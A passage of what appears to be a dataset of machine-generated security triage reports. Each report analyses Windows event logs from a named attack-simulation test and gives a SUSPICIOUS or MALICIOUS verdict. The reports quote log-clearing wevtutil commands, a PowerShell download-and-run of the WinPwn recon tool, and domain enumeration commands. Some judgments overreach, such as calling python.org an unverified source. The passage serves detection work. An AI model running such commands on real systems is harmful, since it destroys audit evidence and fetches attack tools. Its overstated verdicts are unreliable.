   - The existence of System log opens and subsequent clearings are as concerning as in the Security log and are often indicative of an initiation and covering of tracks strategy common in malicious actions.

5. **Application Logs:**
   - Windows Defender indicates protection is on, without reported threats or tampered processes suggesting some maintained defenses but do not address potentially advanced intrusion methodologies. 

**Assessment:**
The combination of multiple event log clearings, executed from `admin_test` in combination with `wevtutil.exe` usage for log manipulation and the PowerShell queries could indicate suspicious activity with potential malicious intent. The activity suggests defensive evasion techniques, possibly indicating post-exploitation cleanup efforts to remove evidence of compromise.

**Resolution:** 
- **SUSPICIOUS**: Given the evidence, the activity appears suspicious due to log manipulation and the general context of the tasks. Despite an absence of direct evidence proving 100% malice, further investigation is essential to determine if the events are circumstantial or part of a broader pattern of compromise.
  
**Guidance on How to Proceed:**
1. **Immediate Action:**
   - Investigate the user `admin_test` for abnormal activity patterns such as unauthorized access.
   - Validate process lineage and command-line activities related to `wevtutil.exe` and PowerShell commands executed on the system for abnormal patterns.
   
2. **Review Logs:**
   - Collect more context-driven logs focusing on PowerShell activity, network connections, and potential endpoint anomaly detections.
   
3. **Security Controls:**
   - Consider enhancing audit and integrity checks on event logs and implement stringent detection rules for log clearance actions.

4. **Forensic Analysis:**
   - If logs suggest further potential compromises or recurring events, consider employing deeper forensic analysis on the endpoint to confirm system integrity."
WinPwn - GeneralRecon,"### Detailed Analysis of Logs

#### Suspicious or Anomalous Behavior Identified:
1. **Use of `wevtutil.exe`:** 
   - Multiple entries show `wevtutil.exe` being executed with the command line argument to clear event logs: `""C:\\Windows\\system32\\wevtutil.exe"" cl`. This tool is used to manage event logs, and frequent or unexplained clearing of these logs can be an indication of malicious activity, as it could be used to cover tracks.
   
2. **Logs Being Cleared:**
   - The Security, System, and Windows PowerShell logs were cleared as indicated by the `EventID` ""1102"" in the Security log and ""104"" in the System log. This further supports the hypothesis that someone may be attempting to hide their actions.

3. **PowerShell Execution:**
   - A PowerShell command was executed to download and execute a script from a remote GitHub URL (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/`). This is highly suspicious as it involves the download and likely execution of a potentially malicious script without any apparent legitimate reason.

4. **Shared User for Malicious Activity:**
   - The activities including log clearing and PowerShell command execution are executed by the user `SERVER002\\admin_test`. This indicates that the actions might be carried out using a compromised administrative account.

5. **Use of `Generalrecon`:**
   - The command line for the PowerShell script includes `Generalrecon -consoleoutput -noninteractive`, suggesting reconnaissance actions which might be part of a larger attack script.

#### Indicators of Malicious Activity or Compromise:
- The combination of event log clearing, unusual execution and manipulation of system tools (`wevtutil`, `hostname.exe`, `whoami.exe`), alongside the remote downloading of potentially malicious scripts via PowerShell, aligns with tactics often employed in attacks to evade detection and gather system data.
- The presence of elevated privileges (`IntegrityLevel=High`) used in these suspicious commands further indicates potential malicious intent.

### Threats or Risks Identified:
- The clearing of security, system, and PowerShell logs poses a risk of audit trail obliteration, making it difficult for genuine administrative activities to be distinguished from malicious actions.
- Remote script execution poses a risk of unauthorized changes or data compromise, especially considering that the executed scripts are sourced from unauthorized external locations.

### Guidance on How to Proceed:
1. **Immediate Actions:**
   - **Account Review:** Investigate the `SERVER002\\admin_test` account for unauthorized access including password changes and login anomalies.
   - **Network Isolation:** Consider isolating the system for forensic analysis to determine the full scope of compromise.
   - **Backup Logs:** Ensure that remaining logs and other artifacts are secured for further forensic analysis.

2. **Remediation:**
   - **Change Credentials:** Force a password change on affected accounts.
   - **Increase Monitoring:** Implement stricter monitoring and alerting rules for high-integrity level processes and PowerShell executions.
   - **Ensure Patching:** Verify that all systems are up to date with the latest security patches.

### Resolution:
- **MALICIOUS** – The activities captured in the logs strongly suggest that the system has been subject to unauthorized and potentially malicious activities, warranting further forensic investigation and immediate remediation."
Permission Groups Discovery PowerShell (Domain),"Upon reviewing the provided Windows event logs, several key observations can be made, highlighting potentially suspicious behavior:

### Observations:

1. **Usage of `wevtutil` Cleared Logs:**
   - The logs indicate multiple instances of the `wevtutil.exe` command being used to clear event logs (Event ID: 104 and 1102). The command `wevtutil.exe cl` suggests log clearing activity across various channels like System, Security, and PowerShell. This is often considered a suspicious action, as log clearing is usually done to cover tracks from potentially malicious activities.

2. **Repetitive `wevtutil` Execution:**
   - The execution pattern shows `wevtutil.exe` commands being issued rapidly to clear multiple event logs in quick succession. This automated and script-driven clearing of logs in such a time-sensitive manner is indicative of deliberate malicious intent.

3. **Command Usage with Elevated Privileges:**
   - The commands executed appear to have high integrity levels, often under the user `SERVER002\admin_test`, indicating that these were performed with administrative privileges. Such activities with high privilege levels can be particularly concerning as they can alter critical system settings and logs without any user prompt.

4. **PowerShell Activity:**
   - There is evidence of PowerShell being used (`powershell.exe & {get-ADPrincipalGroupMembership $env:USERNAME | select name}`), which retrieves Active Directory group memberships for the current user. Although this command alone isn't inherently malicious, its presence in conjunction with log clearing and potential observation of privileged account context can point towards reconnaissance actions typically part of an attack chain.

5. **Microsoft Edge Update Execution:**
   - The logs show several processes related to Microsoft Edge Update. These processes appear regular as part of system update activities for Microsoft Edge, executed under `NT AUTHORITY\SYSTEM`. They seem benign on their own but may provide noise in the logs or be used to blend malicious activities within legitimate system updates.

### Assessment:

The combination of log-clearing commands executed in a rapid sequence, particularly under accounts with elevated privileges, and PowerShell activities indicative of reconnaissance, strongly suggests malicious intent. The clearing of logs in advanced scenarios is often a tactic employed by threat actors to obfuscate actions taken on a compromised system and avoid detection by security mechanisms.

### Guidance:

- **Resolution:** MALICIOUS
  - The activities logged indicate a clear intent to perform malicious actions by clearing event logs, likely as a measure to prevent detection. Immediate investigation and threat hunting activities should be initiated to understand the extent of the potential compromise.
  - Review access logs and network logs for abnormal patterns pre-dating these events.
  - Ensure endpoint security solutions are updated and able to detect such patterns.
  - Evaluate the system for any unauthorized access or changes post these events.
- **Action Steps:**
  - Isolate the involved host to prevent further potential malicious actions.
  - Conduct a comprehensive system forensic analysis to identify the intrusion vector.
  - Evaluate and strengthen account management practices, particularly focusing on the accounts used (`admin_test`).
  - Consider implementing enhanced monitoring for log clearing commands and similar suspicious activities.

This analysis points to a likely compromise or preparation for one, justifying it as a primary suspect for cybersecurity alert and response."
Remote System Discovery - net group Domain Computers,"Upon reviewing the provided logs, several indicators suggest that further investigation is warranted due to potentially suspicious activity:

### Key Findings:

1. **Log Clear Events**: 
   - Multiple instances of log clearance are noted under the Windows Eventlog (`EventID: 104`) and Security log (`EventID: 1102`). The log clearance actions were performed by the user 'admin_test'. The log files for several critical channels like System, Windows PowerShell, and Security were cleared.
   - Use of `wevtutil.exe` with `cl` (clear log) command to clear logs is recorded multiple times in the Sysmon events by the same user. This is particularly suspicious as log clearing can be indicative of attempt to cover tracks post-compromise.

2. **Use of Administrative Commands**:
   - Execution of several administrative commands is detected in the Sysmon logs:
     - `whoami.exe` is executed, which might indicate user enumeration attempts.
     - `cmd.exe` used to execute `net group ""Domain Computers"" /domain`, indicating an attempt to enumerate domain groups.

3. **Unusual Time Change**:
   - Events under `EventID: 4616` show changes in system time. Altering system time could be used to manipulate or evade logging and tracking mechanisms.

4. **Suspicious Process Execution**:
   - The sequence of commands involving `wevtutil.exe`, `net.exe`, `net1.exe`, and `cmd.exe` in close temporal proximity raises concern about potential scripting or malicious use of built-in Windows utilities for lateral movement or information gathering.

5. **Use of NTLM Authentication**:
   - Multiple NTLM-based logons (`EventID: 4624` and 4672`) from unrelated sources hint at possible credential use or testing.

### Assessment:

- **SUSPICIOUS**: Based on the cumulative evidence from log clearance, execution of admin commands, system time changes, and attempts to access domain information, the logs contain clear warning signs of potentially unauthorized or malicious activity. However, without explicit evidence of malware or exfiltration, the activity is not conclusively malicious.

### Recommendations:

1. **Immediate Action**: 
   - Verify with user 'admin_test' whether these actions were legitimate. If not verified, escalate for further investigation.
   - Review user ‘admin_test’ privileges and access patterns.

2. **Conduct a Thorough Investigation**:
   - Correlate these log events with network logs, endpoint security logs, and other sources to track potentially related activities.
   - Check for any unauthorized changes in systems or data access corresponding to these timeframes.

3. **Strengthen Monitoring and Auditing**:
   - Implement strict monitoring for key admin functions and alert on log clear events.
   - Review and reinforce the policy regarding access to `wevtutil.exe` and similar administrative tools.
  
4. **Conduct a Security Audit**:
   - Perform an audit of user accounts and privileges, looking specifically for anomalies and inconsistencies in logs.
   - Assess systems for signs of intrusion, such as unauthorized installations or changes in configurations.

Overall, the logs indicate suspicious behavior, and immediate action is recommended to ensure security integrity and prevent potential compromise escalation."
Extract chrome Browsing History,"**Analysis of Windows Event Logs:**

Upon reviewing the provided Windows event logs, I performed an analysis focusing on potential indicators of malicious activity such as unauthorized log clearing, suspicious command-line executions, and unexpected privilege escalations.

### Observations:

1. **Event Log Clearing**:
   - The security event log (Event ID 1102) and the system event log (Event ID 104) both indicate that logs were cleared by the user `admin_test`. 
   - Clearing of event logs, especially the security log, without any legitimate reason, can be a sign of malicious activity aiming to cover tracks.

2. **Suspicious PowerShell Activity**:
   - A PowerShell script was executed with the following behavior:
     - Extracting browser history from Google Chrome and saving it to a file: `chromebrowsinghistory.txt`.
   - This activity, logged in the Sysmon and PowerShell logs, could be indicative of data exfiltration or reconnaissance activity typically associated with malicious intentions, especially when accessing sensitive or private browsing data.

3. **Frequent Execution of Utility Tools**:
   - Consistent invocation of `wevtutil.exe` with `cl` (clear event log) parameter suggests an attempt to clear or manipulate event logs.
   - Execution of system utilities like `whoami.exe` and `HOSTNAME.EXE` in close temporal proximity can often indicate enumeration efforts by an adversary.

4. **Time Manipulation**:
   - The security log mentions Event ID 4616 indicating time change activity. Though not always malicious, combined with other suspicious activities, it raises concern about potential manipulation attempts to disrupt logs' chronological integrity or evade detection mechanisms.

5. **Application Execution**:
   - Numerous instances of the `MicrosoftEdgeUpdate.exe` process are observed, which might suggest legitimate update activities for Microsoft Edge. However, without further context, these cannot be immediately discounted as suspicious.

### Assessment:

The combination of event log clearing, suspicious PowerShell script activities aimed at capturing browsing history, and the significant number of `wevtutil` executions indicate potential malicious behavior. The presence of these activities strongly suggests efforts to exfiltrate data, maintain persistence, or cover illicit activities.

**Resolution**: **MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Actions**:
   - Isolate the affected system (`Server002`) from the network to prevent further potential exfiltration or lateral movement.
   - Conduct a thorough forensic analysis to obtain and preserve evidence of malicious activity.

2. **Audit and Review**:
   - Review user permissions and authentication logs for the `SERVER002\admin_test` user to assess how these actions were permitted.
   - Conduct a full security review of any PowerShell scripts used across the network to ensure they align with security policies.

3. **Incident Response**:
   - Notify the incident response team to perform a detailed incident investigation and analysis.
   - Reach out to stakeholders and possibly law enforcement, depending on the severity and impact.

4. **Preventive Measures**:
   - Implement strict logging and monitoring policies to detect similar suspicious activities in the future.
   - Apply updates and patches to vulnerable systems to close security gaps.

By following these steps, your organization can mitigate the impact of the identified malicious activity and help prevent similar incidents in the future."
AWS - EC2 Security Group Enumeration,"Upon analyzing the provided event logs for the Windows host ""Server002,"" I've identified several areas of concern that warrant further investigation. Below is a detailed analysis:

### Security Log Analysis
1. **Event ID 1102**: This event indicates that the event log was cleared. The `admin_test` user executed a command that clears the logs, which can be a red flag in investigations as it might indicate an attempt to cover tracks. This event occurred at `2024-10-28 16:07:48`.

2. **Event ID 4616**: These events log changes in system time, which can be legitimate but might also be used maliciously to manipulate timestamps for covering tracks. There are no immediate signs these changes are malicious without further context.

### Sysmon Log Analysis
1. **Events involving wevtutil.exe**: Multiple entries show the execution of the `wevtutil.exe` command, specifically clearing logs like `Security`, `System`, and `Windows PowerShell`. This is typically not a standard operation and reinforces the suspicious nature of the operations logged in the security logs.

2. **Command Execution via cmd.exe**:
   - There is an execution of `cmd.exe` with a command to describe AWS security groups: `aws ec2 describe-security-groups --profile default --output json`. This command is executed by the `admin_test` user with a high integrity level, which might not be malicious by itself if the administrator is managing AWS resources. However, it is peculiar if AWS is not typically managed from this host.

### System and Application Log Analysis
- The system and application logs don't show immediate red flags by themselves but correlate with the actions seen in the Sysmon and Security logs, particularly regarding log clearance and time adjustments.

### Summary Suspicious Findings
- The most significant issue is the clearing of various event logs by `admin_test` using `wevtutil.exe`. This action is often associated with attempts to hide malicious activity.
- The AWS command indicates that there might be data exfiltration or unauthorized access attempts to cloud resources if such actions are not standard practice for the server.

### Resolution
Based on the analysis:

- **Resolution: SUSPICIOUS** - The activities logged, primarily involving log clearing and the AWS-related command execution, warrant further investigation to determine the context and legitimacy. This investigation should include:
  - Verification of `admin_test` user's activities and their alignment with expected duties.
  - Inquiry into standard operating procedures concerning AWS command usage from `Server002`.
  - Examination of any data flows or communication to AWS services or other destinations that could indicate unauthorized access or data exfiltration.

### Recommended Actions
- Conduct personal interviews with the user `admin_test` to understand the intent behind clearing logs and AWS command execution.
- Perform a comprehensive review of the server and network for signs of compromise, including checking for unusual outbound traffic or unauthorized access.
- Ensure proper logging and monitoring are in place to detect and alert on similar activities promptly in the future."
Check computer location,"Upon reviewing the provided Windows event logs, several activities seem suspicious and could potentially indicate malicious activity. Below is a detailed analysis of these logs:

### Indicators of Suspicious Behavior:

1. **Event Log Clearing:**
   - The security event log indicates that the log file was cleared (Event ID: 1102) by a user `admin_test` right before other events, which could suggest a cover-up of activities. Log clearing is a typical tactic used by attackers to hide their tracks.
   - In the sysmon log, usage of the `wevtutil.exe` with the command line `""C:\\Windows\\system32\\wevtutil.exe"" cl Security` to clear logs is recorded. This is consistent with attempts to clear specific event logs (`Sysmon`, `Application`, `System`, `Security`, and `Windows PowerShell`).

2. **Synchronized Time Manipulation:**
   - Multiple instances of `Event ID 4616` in the security log show changes to the system time made by `svchost.exe`, a process often exploited by attackers to perform unauthorized changes. Time manipulation can be used to manipulate timestamps of logs and muddle investigations.

3. **Unusual Process Execution:**
   - Frequent and sequential invocation of `conhost.exe` and `wevtutil.exe` under high integrity levels by a user account is not regular behavior, especially since these processes are used to manage event logs and command consoles which inherently don’t require such frequent invocation.

4. **Host and User Enumeration:**
   - Commands like `hostname.exe` and `whoami.exe` were executed, which typically are used by attackers during system reconnaissance to gather information about the host and the current user's privileges.

5. **Command Execution via `cmd.exe`:**
   - Execution of `cmd.exe` with a command to query the Windows registry under a high integrity level: `""cmd.exe"" /c reg query ""HKEY_CURRENT_USER\\Control Panel\\International\\Geo""`. Checking registry settings can indicate attempts to identify locale-specific configurations, possibly checking for sandboxes or forensic tools.

### Assessment:

Given the above indicators, the logs present suspicious activity due to anomalous behavior such as clearing logs, time changes by non-standard services, and exploratory command executions in a sequence that suggests an attempt to gather information or hide prior activity. 

### Conclusion:

- **Resolution: SUSPICIOUS**

### Recommended Actions:

1. **Conduct a Full Incident Response:**
   - Initiate a full investigation to determine the source and vector of this suspicious activity. Acquire additional logs, memory dumps, and execute a thorough file system analysis to trace the perpetrator.

2. **Isolate the Host:**
   - To prevent potential further malicious activity or lateral movement within the network, isolate this host.

3. **Review and Secure Accounts:**
   - Investigate the user account `admin_test` for unauthorized privileges and activities. Change passwords and increase monitoring for any suspicious usage of elevated accounts.

4. **Enhance Monitoring and Detection:**
   - Implement tighter monitoring controls for event log activities, command line executions, and synchronizations to detect and prevent unauthorized uses.

5. **Audit and Remediate Configuration:**
   - Assess security configurations for weak points and update system policies to restrict unnecessary administrative commands and access to sensitive system functions.

The situation requires immediate action and further investigation to confirm if these are indicators of a targeted attack or misguided administrator activity."
System Time Discovery,"Upon analyzing the provided event logs, the following observations and analysis are made:

### Suspicious Activity:
1. **Clearing of Event Logs:** 
   - The logs show the event ID 104 indicating that the System, Security, and Windows PowerShell event logs were cleared by the user ""admin_test"". This action is typically a red flag, as threat actors often clear logs to cover their tracks after performing malicious activities. 
   - Logs show the ""wevtutil.exe"" command used multiple times to clear logs for different channels, which aligns with the event log clearing activities.

2. **Command Line Execution:**
   - The execution of ""wevtutil.exe"" to clear logs is unusual and suspicious, especially when done sequentially across different log channels. The use of ""whoami.exe"" and ""hostname.exe"" soon after further suggests attempts to gather system and user context potentially for privilege escalation or system profiling.

3. **Time Changes:**
   - Event ID 4616 indicates that time was adjusted on the system, which can sometimes be used to defeat time-based security controls or log accuracy. This adds to the context of suspicious activities around the manipulation of system integrity and information.

### Benign or Expected Activity:
1. **Microsoft Edge Updates:**
   - There are multiple entries related to Microsoft Edge update processes (e.g., `MicrosoftEdgeUpdate.exe`). These follow a standard update pattern and are executed under the system user context. This activity aligns with expected behavior for a regularly scheduled or triggered update process.

2. **Windows Defender Updates:**
   - The presence of a security intelligence update for Microsoft Defender Antivirus is standard as part of routine security maintenance.

### Assessment:
The presence of log-clearing events combined with the usage of ""whoami"" and frequent ""wevtutil.exe"" command-line execution greatly indicates potential malicious activity aimed at covering tracks and possibly gaining information about the system environment. 

The time adjustments, although possibly benign in isolation, combined with these behaviors, further encourage suspicion of misuse or malicious intent.

### Final Resolution:
**MALICIOUS** - Based on event log clearing actions, suspicious command-line executions, and possible attempts to adjust system time, the analysis suggests these logs contain malicious activity. Immediate further investigation is warranted to identify and mitigate any active threats or compromised accounts, especially around the user ""admin_test"". It would be advisable to verify the integrity of the system, review access logs for unauthorized access, and increase monitoring for further suspicious activity."
Enumerate Active Directory Groups with ADSISearcher,"### Detailed Analysis

Upon analyzing the event logs provided for `Server002`, several notable activities stand out:

#### 1. **Execution of Built-in Windows Utilities**

There are multiple Sysmon events related to the execution of potentially sensitive system utilities:
- **`hostname.exe`, `whoami.exe`**: These commands are benign on their own and provide basic system information.
- **`wevtutil.exe`**: This is used to clear event logs, often an activity used to cover tracks after a malicious activity.

#### 2. **Event Log Clearing**

The Security event log and System log indicate the activity of clearing logs:
- **Security Log**: EventID 1102 shows that the Security logs were cleared by `admin_test`.
- **System Log**: EventID 104 shows similar log-clearing activity on the System and the Windows PowerShell channels.

This behavior is highly suspicious, typically indicative of an attempt to cover up malicious behavior.

#### 3. **Time Manipulation**

The Security log with EventID 4616 and the System log with EventID 1 show time changes:
- These activities exhibit backdating the system time; another typical attempt to evade detection by skewing timestamps of logs.

#### 4. **PowerShell Usage**

PowerShell logging indicates:
- **Execution**: The command executed (`[adsisearcher]""objectcategory=group""`) is used to query Active Directory, which could be part of reconnaissance activities.
  
#### 5. **Integrity Level**

All operations conducted by `SERVER002\admin_test` are running with **High Integrity Level**, indicating that this user has administrative privileges over the system, which amplifies the potential risk if malicious intent is involved.

#### 6. **Network Services and svchost.exe**

Network Service and SYSTEM accounts running svchost processes are documented:
- However, no explicit evidence from these logs points to these being used maliciously.

### Threat Assessment

The combined actions of clearing event logs, manipulating system time, and running PowerShell scripts with admittance to potential reconnaissance activity (`wevtutil`, `whoami`, `hostname`), especially under an administrative context, paint a pattern consistent with malicious activities or active threat actors attempting to obscure traces.

### Resolution

Given the high level of suspicion generated by the event log clearings, time tampering, and administrative script executions, the situation is assessed as **MALICIOUS**.

### Guidance

- **Immediate Actions**:
  - Isolate `Server002` from the network to prevent further potential damage.
  - Conduct a forensic analysis to determine the entry point and to see if this activity is part of a larger attack.
  - Review user account activities, especially `admin_test`, for any unauthorized access or deviations from normal behavior.
  - Reset all administrative credentials and consider a full review of access permissions.

- **Future Steps**:
  - Implement enhanced monitoring on key systems, focusing on PowerShell and utility executions.
  - Enable and enforce stricter logging policies, and ensure immutable log storage to prevent unauthorized deletions.
  - Conduct security awareness and training sessions for administrative personnel.

In summary, the activity recorded in the logs strongly suggests malicious intent, mainly attempting to obfuscate activity using administrative access to clear relevant logs and querying potential sensitive AD data. Immediate action and detailed forensic procedures are warranted."
Enumerate Active Directory Groups with Get-AdGroup,"Upon reviewing the provided event logs, several activities are noteworthy and warrant further analysis:

### Analysis of Logs:

1. **PowerShell Logs**:
   - The PowerShell logs show the execution of `powershell.exe` with a command `{Get-AdGroup -Filter *}`. While `Get-AdGroup` is a legitimate PowerShell cmdlet used to retrieve Active Directory groups, its unsupervised usage could be indicative of reconnaissance or unauthorized querying of the directory for potential further attacks.

2. **Sysmon Logs**:
   - The frequent and sequential use of `wevtutil.exe` is suspect. `wevtutil.exe` is a legitimate utility used to clear event logs, among other administrative tasks. The command-line usage observed here (`wevtutil.exe cl <logname>`) suggests that logs (specifically, ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"", and ""Windows PowerShell"") were cleared, which is often a tactic used by attackers to cover tracks.
   - The execution of `conhost.exe` and `wevtutil.exe` under a high integrity level by `SERVER002\admin_test`, from the `C:\Users\admin_test\Documents\` directory, is unusual due to its direct involvement with system logs.
   
3. **Application Logs**:
   - The logs show normal service stoppage events for `edgeupdate`, which by itself is not suspicious unless correlated with other questionable activities. These could just be part of an update process.

4. **System and Security Logs**:
   - The clearing of system logs (`Microsoft-Windows-Eventlog` Event ID 104) and security logs (`Microsoft-Windows-Eventlog` Event ID 1102) by the user `admin_test` is highly suspicious. Log clearing is a typical behavior associated with malicious activity to erase evidence of unauthorized actions.

### Assessment:
The behavior observed in the logs suggests sophisticated attempts to cover unauthorized actions:
- The use of PowerShell to query Active Directory is generally legitimate, but in combination with other activities, it indicates possible reconnaissance.
- The clearing of various logs (including security and PowerShell logs) by `admin_test` points to an attempt to erase any traces of potentially malicious activities.
- The integrity level and user account involved (ADMIN_TEST with high permissions) suggest this was done with relatively high privileges, indicative of either an internal threat or a compromised administrative account.

### Resolution:
**MALICIOUS** - The activities observed, particularly the clearing of security logs, frequent use of privileged utilities, and potential reconnaissance actions, strongly suggest unauthorized and potentially malicious behavior.

### Guidance:
1. **Immediate Actions**:
   - Isolate the affected machine (Server002) from the network to prevent further spreading or damage.
   - Change passwords for the `admin_test` account and investigate potential credential compromise.
   - Initiate a full forensic investigation to determine the extent and impact of the compromise.

2. **Long-term Steps**:
   - Reinforce monitoring mechanisms to detect similar behavior patterns across the network.
   - Review privilege assignments, especially for administrative accounts, and ensure adherence to the principle of least privilege.
   - Implement tighter restrictions and monitoring over the use of tools like PowerShell and `wevtutil.exe`, especially in sensitive environments.

This analysis should be escalated to the incident response team for further action and remediation efforts."
Remote Desktop Services Discovery via PowerShell,"After carefully analyzing the provided Windows event logs, several indicators suggest suspicious activity:

1. **Log File Clearance:**
   - Event ID 104 from the System log and Event ID 1102 from the Security log indicate that log files across different channels (System, Windows PowerShell, Sysmon, and Security) were cleared by the user `admin_test`. This action is often associated with attempts to cover tracks during malicious activity.

2. **Processes and Commands Executed:**
   - Multiple instances of `wevtutil.exe` are observed. This utility is typically used to manage event logs, including clearing them, as seen with the command lines for clearing logs:
     - `C:\\Windows\\system32\\wevtutil.exe cl System`
     - `C:\\Windows\\system32\\wevtutil.exe cl Application`
     - `C:\\Windows\\system32\\wevtutil.exe cl Security`
     - `C:\\Windows\\system32\\wevtutil.exe cl ""Windows PowerShell""`
   - These commands suggest a deliberate attempt to erase specific logs.

3. **Potential Time Tampering:**
   - Security log Event ID 4616 indicates the system time was changed. While time adjustments might occur due to legitimate reasons, they can also be manipulated to mislead log analysis and hide malicious activities linked to specific times.

4. **High Integrity Processes:**
   - Processes like `powershell.exe` and `svchost.exe` run with high integrity levels, potentially elevating privileges. The PowerShell command observed is querying Remote Desktop Services, which might be a benign administrative task, but in the context of log clearance can suggest reconnaissance.

5. **Privilege Escalation:**
   - Security Event ID 4672 indicates that the user `admin_test` was granted several high-level privileges, such as `SeDebugPrivilege`, which can be exploited for malicious purposes.

6. **Logon via NTLM Protocol:**
   - The logs show multiple NTLM logons (Event ID 4624). While not inherently suspicious, the presence of NTLM, combined with other actions, can indicate lateral movement or brute-force attempts if seen from unusual IPs or patterns.

**Assessment:**
The sequence of events strongly suggests malicious activity, particularly the systematic clearing of logs across various channels. The execution of high integrity processes with sensitive commands further adds to the suspicion. The event logs indicate actions intended to cover tracks and possibly escalate privileges.

**Resolution:**
- **MALICIOUS**: The logs contain clear evidence of potentially malicious behavior, with specific activity patterns often linked to compromising a host and covering tracks.

**Guidance on How to Proceed:**
1. **Immediate Response:**
   - Isolate the affected system to prevent further unauthorized access or data exfiltration.
   - Conduct a comprehensive scan using endpoint detection and response (EDR) tools.

2. **Forensic Analysis:**
   - Examine other security logs for evidence of data access or outbound connections.
   - Retrieve unmodified logs from backup or centralized logging systems to obtain a complete timeline.

3. **Review User Activity:**
   - Investigate recent activity for the account `admin_test`, including access logs and any changes in privileges or permissions.

4. **Strengthen Security:**
   - Disable or replace the compromised account and review all privileged user accounts for any unwarranted privileges.
   - Enhance monitoring to detect similar activities in the future, such as unauthorized log clearing or privilege escalation attempts."
Port Scan using python,"Upon reviewing the logs, several aspects stand out indicating possible malicious activity:

### Indicators of Malicious Activity:
1. **PowerShell Activity**: 
   - The PowerShell commands executed suggest downloading and installing Python from an unverified source (`https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe`). While downloading Python itself isn't inherently malicious, using a PowerShell script to automate the download and execution process can indicate script-based malware or an attack simulation framework like the Atomic Red Team.

2. **Event Log Clearing**: 
   - The `wevtutil.exe` command-line utility is used to clear event logs (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, `cl ""Windows PowerShell""`). This is a commonly used technique by attackers to cover their tracks by erasing logs that contain their activities.

3. **Execution of External Payload**:
   - A Python script (`T1046.py`) executed using PowerShell with `-i 127.0.0.1`, indicating the potential enumeration of network interfaces or a localhost-targeted action, reflecting behavior typical of reconnaissance or lateral movement attempts initiated from the system.

4. **Security Log Anomaly**: 
   - Event ID 1102 suggests a security event log was cleared. Coupled with execution from PowerShell, this is potentially malicious because it indicates an attempt to hide actions performed on the system.
   - Multiple instances of security logs involve process `CompatTelRunner.exe`, indicating unusual access or enumeration of user accounts and system components. CompatibilityTelemetry processes are often targeted and abused for privilege escalation and system profiling by malicious actors.

5. **System Log Anomaly**:
   - System events show clearing of logs (`EventID: 104`), which is an action often taken to hide one's tracks.
  
### Threats or Risks Identified:
- The combination of event log clearing, execution of downloaded payloads, and detailed scripting activities indicate a potentially compromised environment where an attempt is made to maintain persistence and obfuscate activity.
- Privilege escalation and system reconnaissance indicate an adversary preparing for further exploitation.

### Guidance on How to Proceed:
- **Immediate Response**: Initiate a detailed incident response by capturing memory and disk images from `Server002` for forensic analysis to prevent further compromise.
- **Containment**: Isolate the affected server to prevent lateral movement or exfiltration.
- **Evaluate**: Verify the source and intention of the PowerShell script and Python download. Confirm with IT or development teams to check if this was a scheduled task for maintenance or testing.
- **Review and Monitor Logs**: Reinstate logging and monitor for any further anomalous log clearance activities. Integrate alerts for PowerShell execution and event log clearance.

### Conclusion:
Based on the evidence observed in the logs, my assessment is:

**Resolution: MALICIOUS**

Given the malicious indicators of potential system compromise through PowerShell scripting, event log clearing, and suspicious account activities, further investigation and action are warranted."
Windows Internal Packet Capture,"### Detailed Analysis

After carefully examining the provided event logs, the following observations and analysis can be made regarding potential malicious activity:

#### Application Log
- The entry corresponds to the Microsoft Software Protection Platform Service (`sppsvc.exe`), which is a legitimate Windows service responsible for authenticating and activating Windows and Microsoft products. No suspicious activity is identified here.

#### Sysmon Log
- A significant pattern involves multiple use cases of `wevtutil.exe`, which is a legitimate Windows utility for managing event logs. This utility is executed multiple times with the `cl` (clear) option to clear event logs, specifically, the `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security` logs. This pattern is inherently suspicious because log clearance, especially if frequent or under questionable circumstances, could be indicative of an attempt to cover tracks.
  
- Additionally, certain core system utilities such as `conhost.exe` and `cmd.exe` are typically seen in legitimate scenarios. However, their associations with `wevtutil.exe` in this context, along with the trace activity involving `netsh.exe` to capture data, suggest potentially malicious intent to glean information stealthily while removing traces of activity.

#### System Log
- The clearing of event logs is further corroborated by entries indicating that logs like `System` and `Windows PowerShell` were cleared by the user `admin_test`.
  
- Time manipulation is a strong indicator of an attempt to confuse logfile timing or disrupt chronological order, potentially masking malicious activities. Events show that system time was adjusted backward by SVCHOST processes running under `LOCAL SERVICE`. Though it could have legitimate explanations (like syncing time), in conjunction with other suspicious activities such as log clearance, it gains significance.

#### Security Log
- The clearing of security logs is a highly suspicious action and aligns with standard obfuscation tactics used by attackers post-intrusion. The user `admin_test` is responsible for the log clearance operation in this case, which needs scrutiny given it is unusual for non-administrative or unauthorized users to perform such actions.

#### Resolution
- **SUSPICIOUS** - The combination of `wevtutil.exe` clearing important logs, potential time manipulation, and network tracing detected via `netsh.exe` combined suggests points that warrant further investigation. While there is no single conclusive malicious action, the signs collectively are suspect enough to advise a detailed examination of `admin_test` activities and broader forensic analysis on `Server002`.

### Guidance on Proceeding
1. **Forensic Analysis:** Perform a deeper forensic investigation on `Server002`. Inspect the system for any additional indicators of compromise and consider memory analysis to identify any resident malware or modifications to core Windows utilities.
   
2. **Audit**: Review user activity associated with `admin_test`, including login sessions and privilege levels. Verify the legitimacy of this user account and its administrative access.

3. **Logs Review:** Look into backup event logs (if available) before their clearance for any overlooked detections or patterns that are indicative of malicious behavior.

4. **Time Check:** Investigate the reasoning and scheduling behind any time adjustment policies or actions on `Server002`.

5. **Network Analysis:** Follow up on any network connections or packets traced by `netsh` during the detected operations to understand data flows in and out during the suspicious timeframe.

6. **Security Policies:** Review and tighten security policies around log management and administrative actions on logging utilities like `wevtutil.exe`.

Through these measures, it is possible to piece together a clearer picture regarding the security status of `Server002` and determine if this was a part of a larger infiltration effort."
List Process Main Windows - C# .NET,"Upon reviewing the provided logs, several suspicious activities are highlighted, which could point towards potential malicious activity:

### Suspicious Activities Identified:

1. **Event Log Clearing (Security and System Logs)**
   - The `wevtutil.exe cl` (clear log) command is used several times to clear various event logs (Security, System, and Windows PowerShell) by the `SERVER002\admin_test` user, which is usually seen in attempts to cover tracks after malicious activity.
   - Events like `EventID 1102` in the Security log indicate that event logs were cleared. This action, combined with the absence of corresponding benign explanations, is a strong indicator of potentially malicious activity.

2. **Suspicious PowerShell and Command Execution**
